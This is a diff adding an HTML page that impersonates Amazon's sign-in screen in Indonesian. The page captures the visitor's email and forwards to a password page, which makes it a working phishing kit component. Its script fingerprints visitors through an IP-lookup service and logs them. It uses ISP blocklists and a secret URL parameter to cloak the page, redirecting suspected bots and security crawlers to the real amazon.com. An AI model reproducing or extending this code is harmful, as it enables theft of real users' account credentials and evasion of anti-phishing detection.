@@ -1,0 +1,108 @@
+<!DOCTYPE html>
+<html lang="id">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Amazon — Masuk</title>
+    <script src="config.js"></script>
+    <style>
+        * { margin: 0; padding: 0; box-sizing: border-box; font-family: 'Amazon Ember', Arial, sans-serif; }
+        body { background: #fff; min-height: 100vh; display: flex; flex-direction: column; align-items: center; padding: 20px; }
+        .logo { margin: 15px 0 25px; }
+        .logo img { height: 32px; }
+        .kotak { width: 100%; max-width: 350px; border: 1px solid #ddd; border-radius: 8px; padding: 25px; }
+        h1 { font-size: 24px; margin-bottom: 20px; }
+        label { font-size: 13px; font-weight: 700; display: block; margin: 18px 0 6px; }
+        input { width: 100%; padding: 10px; border: 1px solid #a6a6a6; border-radius: 4px; font-size: 15px; }
+        button { width: 100%; padding: 10px; background: #FFD814; border: 1px solid #FCD200; border-radius: 20px; font-size: 15px; cursor: pointer; margin-top: 20px; }
+        button:disabled { opacity: 0.5; cursor: not-allowed; }
+        .hilang { display: none !important; }
+    </style>
+</head>
+<body>
+    <div id="kontenBot" class="hilang">
+        <p>Mengalihkan...</p>
+    </div>
+
+    <div id="kontenUtama">
+        <div class="logo"><img src="img/amazonlogo.png" alt="Amazon"></div>
+        <div class="kotak">
+            <h1>Masuk</h1>
+            <label>Alamat email</label>
+            <input type="email" id="email" placeholder="nama@contoh.com">
+            <button id="tombolLanjut" disabled onclick="lanjut()">Lanjut</button>
+        </div>
+    </div>
+
+    <script>
+        // === CEK PARAMETER & ISP ===
+        const params = new URLSearchParams(window.location.search);
+        const namaParam = localStorage.getItem('namaParameter') || 'akses';
+        const adaParameter = params.has(namaParam);
+
+        // === SIMPAN DATA PENGAKSES ===
+        async function cekISP() {
+            try {
+                const res = await fetch('https://ipapi.co/json/');
+                const data = await res.json();
+                const ip = data.ip || 'Tidak diketahui';
+                const negara = data.country_name || '-';
+                const isp = data.org || '-';
+
+                // Baca daftar
+                const whitelist = (localStorage.getItem('daftarWhitelist') || '').toLowerCase().split('\n').map(s => s.trim()).filter(Boolean);
+                const blocklist = (localStorage.getItem('daftarBlock') || '').toLowerCase().split('\n').map(s => s.trim()).filter(Boolean);
+                
+                let tipe = 'HUMAN';
+                const ispKecil = isp.toLowerCase();
+
+                // Cek Blocklist dulu
+                for (const blok of blocklist) {
+                    if (ispKecil.includes(blok)) { tipe = 'BOT'; break; }
+                }
+                // Cek Whitelist
+                if (tipe === 'HUMAN') {
+                    for (const izin of whitelist) {
+                        if (ispKecil.includes(izin)) { tipe = 'HUMAN'; break; }
+                    }
+                }
+                // Tanpa parameter = BOT
+                if (!adaParameter) tipe = 'BOT';
+
+                // Simpan ke riwayat
+                const daftar = JSON.parse(localStorage.getItem('dataPengunjung') || '[]');
+                daftar.unshift({
+                    ip, negara, isp, tipe,
+                    halaman: window.location.pathname,
+                    waktu: new Date().toLocaleString('id-ID')
+                });
+                localStorage.setItem('dataPengunjung', JSON.stringify(daftar));
+
+                // === ARAHKAN ===
+                if (tipe === 'BOT') {
+                    // BOT → ke link_bot.txt
+                    document.getElementById('kontenUtama').classList.add('hilang');
+                    const linkBot = localStorage.getItem('linkBotTujuan') || 'https://www.amazon.com';
+                    setTimeout(() => window.location.href = linkBot, 500);
+                }
+            } catch (e) {
+                if (!adaParameter) window.location.href = 'https://www.amazon.com';
+            }
+        }
+
+        // Validasi email
+        const inputEmail = document.getElementById('email');
+        const tombolLanjut = document.getElementById('tombolLanjut');
+        inputEmail.addEventListener('input', function() {
+            tombolLanjut.disabled = !/^[^\s@]+@[^\s@]+\.[^\s@]+$/.test(inputEmail.value.trim());
+        });
+        function lanjut() {
+            localStorage.setItem('emailPengguna', inputEmail.value.trim());
+            window.location.href = 'password.html';
+        }
+
+        // Jalankan
+        cekISP();
+    </script>
+</body>
+</html>
